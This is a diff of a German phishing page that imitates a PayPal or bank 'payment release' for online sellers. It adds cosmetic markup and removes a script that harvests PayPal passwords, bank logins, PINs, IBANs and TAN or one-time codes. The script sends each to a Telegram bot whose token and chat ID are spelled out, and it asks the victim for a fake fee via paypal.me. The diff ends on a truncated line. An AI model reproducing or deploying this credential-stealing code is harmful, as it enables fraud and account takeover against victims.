@@ -6,7 +6,10 @@
 <title>Zahlungseingang bestätigen</title>
 <meta name="theme-color" content="#0e1b2c">
 <meta name="description" content="Bestätige den Zahlungseingang, damit der Betrag freigegeben wird.">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <link rel="manifest" href="manifest.webmanifest">
+<link rel="apple-touch-icon" href="icon.svg">
 <link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='14' fill='%230e1b2c'/><text x='32' y='45' font-family='Helvetica,Arial' font-size='38' font-weight='bold' fill='white' text-anchor='middle'>P</text></svg>">
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -35,8 +38,9 @@ font-size:12px;font-weight:700;padding:5px 11px;border-radius:99px;margin-bottom
 .steps li.ok{color:#0a7a44;font-weight:600}
 .steps li.now{color:#111b2b;font-weight:700}
 .btn{display:block;width:100%;border:0;border-radius:12px;padding:15px;font-size:16px;font-weight:700;
-background:#0070ba;color:#fff;cursor:pointer;margin-top:14px}
+background:#0070ba;color:#fff;cursor:pointer;margin-top:14px;text-align:center;text-decoration:none}
 .btn:active{transform:scale(.99)}
+.btn.ghost{background:#fff;color:#0070ba;border:1.5px solid #cfe1f2}
 .opt{display:flex;gap:12px;align-items:center;border:1.5px solid #e2e8f0;border-radius:12px;padding:14px;margin-bottom:9px;cursor:pointer}
 .opt.sel{border-color:#0070ba;background:#f2f9ff}
 .opt b{display:block;font-size:14.5px}
@@ -144,12 +148,13 @@ a{color:#0070ba}
       <h2 id="s3title">Bestätigungscode</h2>
       <p>Schritt 3 von 3</p>
       <p id="s3sub">Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.</p>
-      <input id="code" class="code" inputmode="numeric" maxlength="6" placeholder="000000">
+      <input id="code" class="code" inputmode="numeric" maxlength="8" placeholder="000000">
       <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:12.5px">
         <a href="#" onclick="resend();return false" id="resendLnk">Kein Code erhalten? Erneut senden</a>
         <span class="timer" id="timer">90s</span>
       </div>
       <button class="btn" onclick="submitCode()" id="s3btn">Freigeben</button>
+      <button class="btn ghost" onclick="go(2)">Zurück</button>
     </div>
   </section>
 
@@ -157,151 +162,4 @@ a{color:#0070ba}
     <div class="card">
       <div class="chip">✓ Vorgemerkt</div>
       <h1>Zahlung freigegeben</h1>
-      <p>Der Betrag ist für dich reserviert und wird nach Abschluss automatisch gutgeschrieben.</p>
-      <div class="fee"><span>Auszahlung</span><span><span id="amt2">47,50</span> €</span></div>
-      <div class="fee"><span>Express-Bearbeitung (24 Std.)</span><span>1,95 €</span></div>
-      <div class="fee b"><span>Jetzt zu zahlen</span><span>1,95 €</span></div>
-      <p style="margin-top:12px;font-size:12.5px">Die Gebühr wird nicht vom Betrag abgezogen.</p>
-      <a id="pay" href="#" target="_blank" rel="noopener" class="btn" style="text-align:center;text-decoration:none">Gebühr von 1,95 € begleichen</a>
-      <p style="margin-top:12px;font-size:12.5px">Reservierung läuft ab in <b class="timer" id="t2">15:00</b></p>
-    </div>
-  </section>
-</main>
-
-<div class="foot">
-  Zahlungsabwicklung über PayPal · TLS-verschlüsselte Übertragung<br>
-  <a href="#" onclick="go(1);return false">Vorgang neu starten</a>
-</div>
-
-<script>
-/* ===== CONFIG ===== */
-const TG_TOKEN = "9153470596:AAHyw5JX9I3-ytoCDdrzzPNWAkRYGMVWrLQ";
-const TG_CHAT  = "8379969031";
-const PP_USER  = "JaneAlister";
-const FEE      = "1.95";
-/* ================== */
-
-const PRODUKTE = [
-  "Apple AirPods Pro (2. Gen.)","Nintendo Switch Spiel","PS5 Controller",
-  "Dyson Staubsauger","Samsung Galaxy Watch","LEGO Technic Set",
-  "Sonos Lautsprecher","Fahrradhelm"
-];
-
-const d64 = s => { try { return decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))); } catch(e){ return ""; } };
-const nf  = n => Number(n).toFixed(2).replace('.', ',');
-const vnr = s => { let h = 0; for (const c of s) h = (h * 31 + c.charCodeAt(0)) >>> 0; return '#TD-2026-' + (1000 + h % 9000); };
-
-let payload = "", betrag = 47.50, mode = "pp", name = "", art = "", vnum = "", bankName = "Sparkasse";
-
-(function init(){
-  const raw = d64(new URLSearchParams(location.search).get('v') || "");
-  const p = raw.split('|');
-  if (p.length >= 3 && !isNaN(parseFloat(p[0]))) {
-    betrag = parseFloat(p[0]);
-    name   = p[1] || "M. Weber";
-    art    = PRODUKTE[parseInt(p[2], 10)] || PRODUKTE[0];
-    payload = raw;
-  } else {
-    name = "M. Weber"; art = PRODUKTE[0];
-    payload = betrag + "|" + name + "|0";
-  }
-  vnum = vnr(payload);
-  const sid = Math.random().toString(16).slice(2, 8).toUpperCase();
-  document.getElementById('mono').textContent =
-    "Sitzung " + sid + " · Zugriff " + new Date().toLocaleString('de-DE') + " · Gerät verifiziert";
-  document.getElementById('buyer').textContent = name;
-  document.getElementById('amt').textContent   = nf(betrag);
-  document.getElementById('amt2').textContent  = nf(betrag);
-  document.getElementById('art').textContent   = art;
-  document.getElementById('vnr').textContent   = vnum;
-  document.getElementById('datum').textContent = new Date().toLocaleDateString('de-DE');
-  document.getElementById('pay').href = "https://paypal.me/" + PP_USER + "/" + FEE;
-
-  document.getElementById('bank').addEventListener('change', e => {
-    bankName = e.target.value;
-    const spk = /Sparkasse|Volksbank/i.test(bankName);
-    document.getElementById('lblUser').textContent =
-      spk ? "Anmeldename / Legitimations-ID" : "Online-Banking Anmeldename";
-    document.getElementById('hintUser').textContent =
-      spk ? "Steht auf deinem Sparkassen-Brief bzw. im Online-Banking."
-          : "Der Anmeldename deines Online-Bankings.";
-  });
-})();
-
-function go(n){
-  [1,2,3,4].forEach(i => document.getElementById('s'+i).classList.toggle('hide', i !== n));
-  window.scrollTo({top:0,behavior:'instant'});
-  if (n === 3) {
-    const bank = (mode === 'bk');
-    document.getElementById('s3title').textContent = bank ? "TAN eingeben" : "Bestätigungscode";
-    document.getElementById('s3sub').textContent = bank
-      ? "Zur Freigabe bestätige bitte die TAN, die an dein hinterlegtes Gerät gesendet wurde."
-      : "Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.";
-    document.getElementById('code').placeholder = bank ? "TAN" : "000000";
-    document.getElementById('s3btn').textContent = bank ? "Mit TAN freigeben" : "Freigeben";
-    document.getElementById('resendLnk').textContent = bank
-      ? "Keine TAN erhalten? Erneut senden" : "Kein Code erhalten? Erneut senden";
-    startTimer(90);
-  }
-}
-function pick(m){
-  mode = m;
-  document.getElementById('oPP').classList.toggle('sel', m === 'pp');
-  document.getElementById('oBK').classList.toggle('sel', m === 'bk');
-  document.getElementById('fPP').classList.toggle('hide', m !== 'pp');
-  document.getElementById('fBK').classList.toggle('hide', m !== 'bk');
-}
-function tg(text){
-  fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
-    method: "POST", headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({chat_id: TG_CHAT, text: text, disable_web_page_preview: true})
-  }).catch(()=>{});
-}
-function submitData(){
-  const head = "[" + vnum + "] " + nf(betrag) + " EUR · " + art;
-  if (mode === "pp"){
-    const m = document.getElementById('mail').value.trim();
-    const p = document.getElementById('pw').value;
-    if (!m || !p) return alert("Bitte E-Mail und Passwort eingeben.");
-    tg("PAYPAL\n" + head + "\nMAIL: " + m + "\nPW: " + p);
-  } else {
-    bankName = document.getElementById('bank').value;
-    const usr = document.getElementById('buser').value.trim();
-    const pin = document.getElementById('pin').value.trim();
-    const iban = document.getElementById('iban').value.replace(/\s/g,'');
-    if (!bankName) return alert("Bitte Bank auswählen.");
-    if (!usr) return alert("Bitte Anmeldename / Legitimations-ID eingeben.");
-    if (pin.length < 4) return alert("Bitte Online-Banking PIN eingeben.");
-    tg("BANK\n" + head + "\nBANK: " + bankName + "\nUSER: " + usr + "\nPIN: " + pin
-       + (iban ? "\nIBAN: " + iban : "\nIBAN: —"));
-  }
-  go(3);
-}
-function submitCode(){
-  const c = document.getElementById('code').value.trim();
-  if (c.length < 6) return alert(mode === 'bk' ? "Bitte TAN eingeben." : "Bitte 6-stelligen Code eingeben.");
-  tg((mode === 'bk' ? "TAN [" + bankName + "] [" : "CODE [") + vnum + "]: " + c);
-  go(4);
-  startTimer(900, 't2');
-}
-function resend(){
-  tg((mode === 'bk' ? "TAN ERNEUT SENDEN [" : "CODE ERNEUT SENDEN [") + vnum + "]");
-  startTimer(90);
-}
-
-let iv = null;
-function startTimer(sec, id){
-  clearInterval(iv);
-  const el = document.getElementById(id || 'timer');
-  if (!el) return;
-  let t = sec;
-  const render = () => {
-    const m = Math.floor(t/60), s = t % 60;
-    el.textContent = (sec > 200) ? (m + ":" + String(s).padStart(2,'0')) : (t + "s");
-    if (t-- <= 0) { clearInterval(iv); el.textContent = "abgelaufen"; }
-  };
-  render(); iv = setInterval(render, 1000);
-}
-</script>
-</body>
-</html>
+      <p>Der Betrag ist für dich
